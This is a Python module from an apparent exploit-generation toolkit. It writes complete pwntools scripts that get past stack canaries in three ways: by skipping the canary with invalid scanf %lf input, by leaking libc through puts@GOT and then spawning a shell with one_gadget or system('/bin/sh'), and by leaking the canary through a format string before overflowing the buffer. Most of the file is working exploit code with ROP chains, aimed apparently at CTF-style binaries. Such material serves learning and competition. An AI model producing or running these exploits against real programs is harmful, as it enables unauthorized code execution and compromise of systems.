"""
Canary Bypass Exploit Generation.

Generates exploits that bypass stack canaries using various techniques:
- scanf skip technique (entering invalid input)
- Format string canary leak
- Multi-stage leak and exploit
"""

import struct
from dataclasses import dataclass
from typing import TYPE_CHECKING, List, Optional, Dict, Any

if TYPE_CHECKING:
    from supwngo.core.binary import Binary

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


def addr_to_double(addr: int) -> str:
    """
    Convert a 64-bit address to its double representation for scanf %lf.

    When scanf reads with %lf, it interprets input as a double-precision
    floating point number. This function converts an address to the string
    representation that scanf will store as the desired address bytes.

    Args:
        addr: 64-bit address to convert

    Returns:
        String representation of the double that encodes this address
    """
    packed = struct.pack('<Q', addr)
    double_val = struct.unpack('d', packed)[0]
    return str(double_val)


def double_to_addr(double_str: str) -> int:
    """
    Convert a double string back to its 64-bit integer representation.

    Args:
        double_str: String representation of double

    Returns:
        64-bit integer value
    """
    double_val = float(double_str)
    packed = struct.pack('d', double_val)
    return struct.unpack('<Q', packed)[0]


@dataclass
class ScanfBypassExploit:
    """Scanf-based canary bypass exploit configuration."""
    binary_path: str
    buffer_size: int          # Size of buffer in elements
    canary_index: int         # Array index where canary is located
    rbp_index: int            # Array index for saved RBP
    rip_index: int            # Array index for return address
    skip_char: str = "."      # Character to skip canary
    format_spec: str = "%lf"  # scanf format specifier


def generate_scanf_bypass_script(
    binary: "Binary",
    canary_index: int = 33,
    target_addr: int = 0,
    target_name: str = "target",
    libc_path: Optional[str] = None,
    two_stage: bool = True,
    num_grades_prompt: str = "Number of grades:",
    grade_prompt: str = "Grade [",
) -> str:
    """
    Generate a scanf canary bypass exploit script.

    This generates a complete pwntools script that exploits the scanf
    skip technique to bypass stack canaries.

    Args:
        binary: Target binary
        canary_index: Array index where canary is located
        target_addr: Target address (win function or one_gadget)
        target_name: Name for the target (for comments)
        libc_path: Path to libc for two-stage exploitation
        two_stage: If True, generate leak + exploit script
        num_grades_prompt: Prompt for number of grades
        grade_prompt: Prompt for each grade

    Returns:
        Complete Python exploit script
    """
    binary_name = binary.path.name if hasattr(binary.path, 'name') else str(binary.path)

    # Get useful addresses from binary
    puts_plt = binary.plt.get('puts', 0)
    puts_got = binary.got.get('puts', 0)
    main_addr = binary.symbols.get('main', 0)
    if hasattr(main_addr, 'address'):
        main_addr = main_addr.address

    # Find ROP gadgets
    pop_rdi = 0
    ret = 0
    try:
        from supwngo.exploit.rop.gadgets import GadgetFinder
        finder = GadgetFinder(binary)
        finder.find_gadgets()
        pop_rdi_gadget = finder.find_pop_reg('rdi')
        if pop_rdi_gadget:
            pop_rdi = pop_rdi_gadget.address
        ret_gadget = finder.find_ret()
        if ret_gadget:
            ret = ret_gadget.address
    except Exception:
        pass

    if two_stage and libc_path:
        return _generate_two_stage_script(
            binary_name, canary_index, libc_path,
            puts_plt, puts_got, main_addr, pop_rdi, ret,
            num_grades_prompt, grade_prompt
        )
    else:
        return _generate_single_stage_script(
            binary_name, canary_index, target_addr, target_name,
            ret, num_grades_prompt, grade_prompt
        )


def _generate_single_stage_script(
    binary_name: str,
    canary_index: int,
    target_addr: int,
    target_name: str,
    ret_gadget: int,
    num_grades_prompt: str,
    grade_prompt: str,
) -> str:
    """Generate single-stage (direct) exploit script."""
    return f'''#!/usr/bin/env python3
"""
Scanf Canary Bypass Exploit for {binary_name}
Generated by supwngo

Technique: scanf %lf skip
The program uses scanf("%lf") in a loop to read grades.
Entering "." causes scanf to NOT write to the destination,
allowing us to skip over the canary without corrupting it.

Canary index: {canary_index}
Target: {target_name} @ {hex(target_addr)}
"""

from pwn import *
import struct

# Configuration
BINARY = "{binary_name}"
REMOTE_HOST = ""  # Set for remote
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"


def hxd(val):
    """Convert address to double representation for scanf %lf."""
    packed = struct.pack('<Q', val)
    double_val = struct.unpack('d', packed)[0]
    return str(double_val)


def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Target address
    target = {hex(target_addr)}  # {target_name}
    {"ret_gadget = " + hex(ret_gadget) if ret_gadget else "# ret_gadget = 0x... # Find ret gadget for alignment if needed"}

    # Canary is at index {canary_index}
    # We need to send {canary_index + 3} values total:
    # - Indices 0 to {canary_index - 1}: buffer fill
    # - Index {canary_index}: SKIP (canary)
    # - Index {canary_index + 1}: RBP (junk)
    # - Index {canary_index + 2}: RIP (target)

    total_elements = {canary_index + 3}

    # Select option 2 (Add new grades)
    io.sendlineafter(b"> ", b"2")

    # Send number of grades
    io.sendlineafter(b"{num_grades_prompt}", str(total_elements).encode())

    log.info(f"Sending {{total_elements}} elements, canary at index {canary_index}")

    for i in range(total_elements):
        io.recvuntil(b"{grade_prompt}")

        if i < {canary_index}:
            # Fill buffer with arbitrary values
            io.sendline(b"1.0")
        elif i == {canary_index}:
            # SKIP the canary by sending invalid input
            log.info(f"Skipping canary at index {{i}}")
            io.sendline(b".")
        elif i == {canary_index + 1}:
            # Overwrite saved RBP (can be junk)
            io.sendline(hxd(0x4141414141414141).encode())
        elif i == {canary_index + 2}:
            # Overwrite return address with target
            log.info(f"Overwriting RIP with {{hex(target)}}")
            {"io.sendline(hxd(ret_gadget).encode())  # Stack alignment" if ret_gadget else "# io.sendline(hxd(ret_gadget).encode())  # Add ret for alignment if needed"}
            io.sendline(hxd(target).encode())

    log.success("Payload sent, enjoy your shell!")
    io.interactive()


if __name__ == "__main__":
    exploit()
'''


def _generate_two_stage_script(
    binary_name: str,
    canary_index: int,
    libc_path: str,
    puts_plt: int,
    puts_got: int,
    main_addr: int,
    pop_rdi: int,
    ret: int,
    num_grades_prompt: str,
    grade_prompt: str,
) -> str:
    """Generate two-stage (leak + exploit) script."""
    return f'''#!/usr/bin/env python3
"""
Two-Stage Scanf Canary Bypass Exploit for {binary_name}
Generated by supwngo

Technique: scanf %lf skip + libc leak + one_gadget

Stage 1: Leak libc address via puts@GOT
Stage 2: Use one_gadget to spawn shell

Canary index: {canary_index}
"""

from pwn import *
import struct

# Configuration
BINARY = "{binary_name}"
LIBC = "{libc_path}"
REMOTE_HOST = ""  # Set for remote
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"


def hxd(val):
    """Convert address to double representation for scanf %lf."""
    packed = struct.pack('<Q', val)
    double_val = struct.unpack('d', packed)[0]
    return str(double_val)


def send_grades(io, values, canary_idx, num_grades_prompt, grade_prompt):
    """
    Send grade values, skipping the canary.

    Args:
        io: pwntools tube
        values: List of values to send after canary (RBP, RIP, ...)
        canary_idx: Index where canary is located
    """
    total = canary_idx + 1 + len(values)

    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(num_grades_prompt.encode(), str(total).encode())

    for i in range(total):
        io.recvuntil(grade_prompt.encode())

        if i < canary_idx:
            io.sendline(b"1.0")
        elif i == canary_idx:
            # Skip canary
            io.sendline(b".")
        else:
            # Send our controlled values
            val_idx = i - canary_idx - 1
            if val_idx < len(values):
                io.sendline(hxd(values[val_idx]).encode())
            else:
                io.sendline(b"0.0")


def exploit():
    elf = ELF(BINARY)
    libc = ELF(LIBC)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # Addresses
    puts_plt = {hex(puts_plt) if puts_plt else "elf.plt['puts']"}
    puts_got = {hex(puts_got) if puts_got else "elf.got['puts']"}
    main_addr = {hex(main_addr) if main_addr else "elf.symbols['main']"}
    pop_rdi = {hex(pop_rdi) if pop_rdi else "0x0  # TODO: Find pop rdi; ret gadget"}
    ret_gadget = {hex(ret) if ret else "0x0  # TODO: Find ret gadget"}

    canary_idx = {canary_index}
    num_grades_prompt = "{num_grades_prompt}"
    grade_prompt = "{grade_prompt}"

    # === Stage 1: Leak libc ===
    log.info("Stage 1: Leaking libc address...")

    # ROP chain to leak puts@GOT and return to main
    # Values after canary: [RBP, pop_rdi, puts_got, puts_plt, main]
    leak_chain = [
        0x4141414141414141,  # RBP (junk)
        pop_rdi,             # pop rdi; ret
        puts_got,            # puts@GOT
        puts_plt,            # puts@PLT
        main_addr,           # return to main for stage 2
    ]

    send_grades(io, leak_chain, canary_idx, num_grades_prompt, grade_prompt)

    # Receive leaked address
    io.recvuntil(b"average is:")
    io.recvline()
    leak_data = io.recvline().strip()

    # Parse leaked address (first 6 bytes)
    if len(leak_data) >= 6:
        leaked_puts = u64(leak_data[:6].ljust(8, b"\\x00"))
    else:
        leaked_puts = u64(leak_data.ljust(8, b"\\x00"))

    log.success(f"Leaked puts@libc: {{hex(leaked_puts)}}")

    # Calculate libc base
    libc.address = leaked_puts - libc.symbols['puts']
    log.success(f"Libc base: {{hex(libc.address)}}")

    # Get one_gadget or system + /bin/sh
    system = libc.symbols['system']
    binsh = next(libc.search(b"/bin/sh\\x00"))

    # Try one_gadget offsets (common for many libc versions)
    # Adjust these based on your libc version
    one_gadget_offsets = [0x4f3d5, 0x4f432, 0x10a41c, 0xe6c7e, 0xe6c81]

    log.info(f"system: {{hex(system)}}")
    log.info(f"/bin/sh: {{hex(binsh)}}")

    # === Stage 2: Get shell ===
    log.info("Stage 2: Spawning shell...")

    # Method 1: Try one_gadget first
    for offset in one_gadget_offsets:
        one_gadget = libc.address + offset
        log.info(f"Trying one_gadget at {{hex(one_gadget)}}")

        # ROP chain: [RBP, ret (alignment), one_gadget, NULL padding for constraint]
        shell_chain = [
            0x4141414141414141,  # RBP
            ret_gadget,          # ret for alignment
            one_gadget,          # one_gadget
            0,                   # NULL for constraint [rsp+0x40] == NULL
            0, 0, 0, 0,         # More NULLs for constraints
        ]

        try:
            send_grades(io, shell_chain, canary_idx, num_grades_prompt, grade_prompt)

            # Check if we got shell
            io.sendline(b"echo PWNED")
            response = io.recv(timeout=1)
            if b"PWNED" in response:
                log.success("Shell obtained!")
                io.interactive()
                return
        except Exception:
            # Try next one_gadget
            io = process(BINARY) if not REMOTE_HOST else remote(REMOTE_HOST, REMOTE_PORT)
            continue

    # Method 2: Fallback to system("/bin/sh")
    log.info("Falling back to system('/bin/sh')")
    shell_chain = [
        0x4141414141414141,  # RBP
        ret_gadget,          # ret for alignment
        pop_rdi,             # pop rdi; ret
        binsh,               # "/bin/sh"
        system,              # system()
    ]

    send_grades(io, shell_chain, canary_idx, num_grades_prompt, grade_prompt)

    log.success("Shell chain sent!")
    io.interactive()


if __name__ == "__main__":
    exploit()
'''


def generate_canary_leak_script(
    binary: "Binary",
    format_offset: int,
    canary_stack_offset: int,
) -> str:
    """
    Generate a format string canary leak exploit script.

    Args:
        binary: Target binary
        format_offset: Format string offset on stack
        canary_stack_offset: Offset to canary from format string start

    Returns:
        Python exploit script
    """
    binary_name = binary.path.name if hasattr(binary.path, 'name') else str(binary.path)

    return f'''#!/usr/bin/env python3
"""
Format String Canary Leak Exploit for {binary_name}
Generated by supwngo

Technique: Leak canary via format string, then overflow

Format string offset: {format_offset}
Canary stack offset: {canary_stack_offset}
"""

from pwn import *

# Configuration
BINARY = "{binary_name}"
REMOTE_HOST = ""
REMOTE_PORT = 0

context.binary = BINARY
context.log_level = "info"


def exploit():
    elf = ELF(BINARY)

    if REMOTE_HOST:
        io = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        io = process(BINARY)

    # === Stage 1: Leak canary via format string ===
    log.info("Leaking canary via format string...")

    # Calculate the format string offset to the canary
    # Format: %<offset>$p or %<offset>$lx
    canary_offset = {canary_stack_offset}

    payload = f"%{{canary_offset}}$p".encode()
    io.sendline(payload)

    # Parse leaked canary
    io.recvuntil(b"0x")
    canary_hex = io.recvline().strip()
    canary = int(canary_hex, 16)

    log.success(f"Leaked canary: {{hex(canary)}}")

    # Verify canary format (should end with 00)
    if canary & 0xff != 0:
        log.warning("Canary doesn't end with null byte, might be wrong!")

    # === Stage 2: Overflow with known canary ===
    log.info("Overflowing with known canary...")

    # TODO: Adjust offset and target based on binary analysis
    buffer_size = 64  # Adjust this
    target = elf.symbols.get('win', 0x0)  # Adjust this

    payload = b"A" * buffer_size
    payload += p64(canary)           # Canary
    payload += p64(0xdeadbeef)       # Saved RBP
    payload += p64(target)           # Return address

    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    exploit()
'''
